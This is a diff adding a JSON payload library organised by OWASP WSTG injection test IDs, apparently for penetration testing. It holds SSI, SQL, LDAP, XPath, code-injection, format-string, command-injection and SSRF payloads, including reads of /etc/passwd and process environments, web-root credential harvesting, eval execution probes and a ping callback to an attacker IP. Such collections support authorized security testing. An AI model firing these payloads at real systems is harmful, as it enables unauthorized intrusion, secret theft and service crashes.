@@ -1,0 +1,198 @@
+{
+  "WSTG-INJT-08": {
+    "name": "SSI Injection",
+    "typologies": {
+      "Remote Code execution": {
+        "commands": [
+          { "command": "id", "description": "Confirm code execution and current user identity." },
+          { "command": "whoami", "description": "Confirm the effective username context." },
+          { "command": "ls -la /", "description": "List root directory contents." },
+          { "command": "ls -la /home", "description": "List home directories to identify users." },
+          { "command": "ls -la /var/www", "description": "List web root contents." },
+          { "command": "cat /etc/passwd", "description": "Read local passwd file to enumerate users." },
+          { "command": "cat /etc/hostname", "description": "Read hostname for host identification." },
+          { "command": "cat /etc/hosts", "description": "Read hosts file for internal name resolution." },
+          { "command": "uname -a", "description": "Get kernel and OS version." },
+          { "command": "pwd; env", "description": "Print working directory and environment variables." }
+        ]
+      },
+      "File Disclosure": {
+        "commands": [
+          { "command": "<!--#include virtual=\"/etc/passwd\" -->", "description": "Virtual variant: disclose /etc/passwd." },
+          { "command": "<!--#include file=\"../../../etc/passwd\" -->", "description": "File variant: relative path traversal to /etc/passwd." },
+          { "command": "<!--#include virtual=\"/proc/self/environ\" -->", "description": "Virtual variant: disclose process environment variables." },
+          { "command": "<!--#include virtual=\"/var/www/html/index.php\" -->", "description": "Virtual variant: disclose web app source using an internal path found via RCE." }
+        ]
+      },
+      "Information gathering": {
+        "commands": [
+          { "command": "<!--#exec cmd=\"printenv\" -->", "description": "Printenv injection through SSI #exec to leak environment variables (secrets, paths, config)." }
+        ]
+      }
+    }
+  },
+  "WSTG-INJT-05": {
+    "name": "SQL Injection",
+    "typologies": {
+      "What_Database": {
+        "commands": [
+          { "command": "SELECT name FROM sys.databases;", "description": "What databases exist on this server." }
+        ]
+      },
+      "What_Schemas": {
+        "commands": [
+          { "command": "SELECT name FROM sys.schemas;", "description": "What schemas exist in the database." }
+        ]
+      },
+      "What_Tables": {
+        "commands": [
+          { "command": "SELECT s.name AS schema_name, t.name AS table_name FROM sys.tables t JOIN sys.schemas s ON s.schema_id = t.schema_id ORDER BY 1, 2;", "description": "What tables exist." }
+        ]
+      },
+      "Complex": {
+        "commands": [
+          { "command": "SELECT s.name AS schema_name, o.name, o.type, o.type_desc FROM sys.objects o JOIN sys.schemas s ON s.schema_id = o.schema_id WHERE o.is_ms_shipped = 0 ORDER BY o.type_desc, s.name, o.name;", "description": "Most complex enumeration query: lists all non-system objects with schema and type." }
+        ]
+      }
+    }
+  },
+  "WSTG-INJT-06": {
+    "name": "LDAP Injection",
+    "typologies": {
+      "basic_Payload": {
+        "commands": [
+          { "command": "*)(uid=*))(|(uid=*", "description": "Basic LDAP injection payload to bypass authentication and match any user." }
+        ]
+      },
+      "By_Letter": {
+        "commands": [
+          { "command": "a*)(uid=a*)", "description": "By-letter payload: enumerate users whose uid starts with the given letter (replace 'a' iteratively)." }
+        ]
+      },
+      "By_Word": {
+        "commands": [
+          { "command": "*ITEM*)(uid=*ITEM*))(|uid=*ITEM*", "description": "By-word payload: brute-force a guessed word/value (ITEM) to enumerate attributes and users." }
+        ]
+      }
+    }
+  },
+  "WSTG-INJT-07": {
+    "name": "XPath Injection",
+    "typologies": {
+      "Authentication_Bypass": {
+        "commands": [
+          { "command": "' or '1'='1", "description": "Classic boolean bypass: force the predicate true regardless of the real value." },
+          { "command": "' or ''='", "description": "Empty-string bypass variant for fields where the above gets filtered." }
+        ]
+      },
+      "Blind_Boolean": {
+        "commands": [
+          { "command": "' and count(/*)=1 and '1'='1", "description": "Confirm blind XPath injection by asserting a true structural fact about the document." },
+          { "command": "' and substring(name(/*[1]),1,1)='a' and '1'='1", "description": "Character-by-character extraction of the root node name via substring()." }
+        ]
+      },
+      "Data_Extraction": {
+        "commands": [
+          { "command": "' or count(//user[position()=1]/username)=1 or '1'='1", "description": "Probe for a users/username structure to begin extracting account data." }
+        ]
+      }
+    }
+  },
+  "WSTG-INJT-11": {
+    "name": "Code Injection",
+    "typologies": {
+      "Python_Eval": {
+        "commands": [
+          { "command": "__import__('os').system('id')", "description": "Confirm code execution via Python eval()/exec() sinks." },
+          { "command": "__import__('os').popen('id').read()", "description": "Execution with captured output, for sinks that return a value to the response." }
+        ]
+      },
+      "PHP_Eval": {
+        "commands": [
+          { "command": "system('id');", "description": "Confirm code execution via PHP eval()/assert() sinks." },
+          { "command": "passthru('whoami');", "description": "Alternative PHP execution sink with output streamed directly." }
+        ]
+      },
+      "NodeJS_Eval": {
+        "commands": [
+          { "command": "require('child_process').execSync('id')", "description": "Confirm code execution via Node eval()/Function() sinks." }
+        ]
+      },
+      "Ruby_Eval": {
+        "commands": [
+          { "command": "`id`", "description": "Confirm code execution via Ruby eval()/instance_eval() sinks using backtick execution." }
+        ]
+      }
+    }
+  },
+  "WSTG-INJT-13": {
+    "name": "Format String Injection",
+    "typologies": {
+      "Leak_Memory": {
+        "commands": [
+          { "command": "%x.%x.%x.%x", "description": "Walk the stack as hex words to leak adjacent memory contents." },
+          { "command": "%08x.%08x.%08x.%08x", "description": "Wider hex leak variant for 64-bit stack alignment." }
+        ]
+      },
+      "Crash_DoS": {
+        "commands": [
+          { "command": "%s%s%s%s%s%s%s%s", "description": "Force %s to dereference non-pointer stack values, typically crashing the process." },
+          { "command": "%n%n%n%n", "description": "Force %n memory writes at non-pointer stack values - crash or corruption." }
+        ]
+      },
+      "Arbitrary_Write": {
+        "commands": [
+          { "command": "%5000d%n", "description": "Width-padded %n to attempt a controlled memory write at a chosen offset." }
+        ]
+      }
+    }
+  },
+  "WSTG-INJT-12": {
+    "name": "Command Injection",
+    "typologies": {
+      "Cat": {
+        "commands": [
+          { "command": "cat /etc/passwd", "description": "Read the local passwd file to confirm command execution and enumerate local users." },
+          { "command": "cat /var/www/*", "description": "Dump all files under the web root to harvest source code, credentials, and config." }
+        ]
+      },
+      "Ls": {
+        "commands": [
+          { "command": "ls /var/www/*", "description": "List the web root contents to discover files and directories." },
+          { "command": "ls -la /var/www/*", "description": "Detailed listing of the web root including hidden files, permissions, and ownership." }
+        ]
+      },
+      "Ping": {
+        "commands": [
+          { "command": "ping <myIP>", "description": "ICMP callback to the attacker IP to confirm blind command execution." },
+          { "command": "ping 127.0.0.1:443", "description": "Loopback interaction on port 443 to confirm execution when egress is restricted." }
+        ]
+      }
+    }
+  },
+  "WSTG-INJT-19": {
+    "name": "Server-Side Request Forgery",
+    "typologies": {
+      "Subdomain_payloads": {
+        "command": ["http://sub1.target.com", "http://sub2.target.com", "http://sub3.target.com"],
+        "description": "Subdomain payloads: array of subdomains to probe via the SSRF vector."
+      },
+      "Ports_found": {
+        "command": [22, 80, 443, 3306, 6379, 8080],
+        "description": "Ports found: array of internal ports to test through SSRF (e.g., http://127.0.0.1:PORT)."
+      },
+      "Localhost_strings": {
+        "command": ["localhost", "127.0.0.1", "127.1", "0.0.0.0", "[::1]", "0177.0.0.1", "2130706433", "0x7f000001"],
+        "description": "Localhost strings: array of localhost representations to bypass naive SSRF filters."
+      },
+      "internal_IP_test": {
+        "command": ["10.0.0.1", "172.16.0.1", "192.168.1.1"],
+        "description": "Internal IP test: array of internal IP ranges to probe for reachability via SSRF."
+      },
+      "attacker_IP": {
+        "command": {"YOUR_IP": "<attacker-public-ip>", "Eth0": "<eth0-ip>", "tun0": "<tun0-ip>"},
+        "description": "Attacker IP: addresses to use for out-of-band SSRF callbacks (public IP, eth0, tun0)."
+      }
+    }
+  }
+}
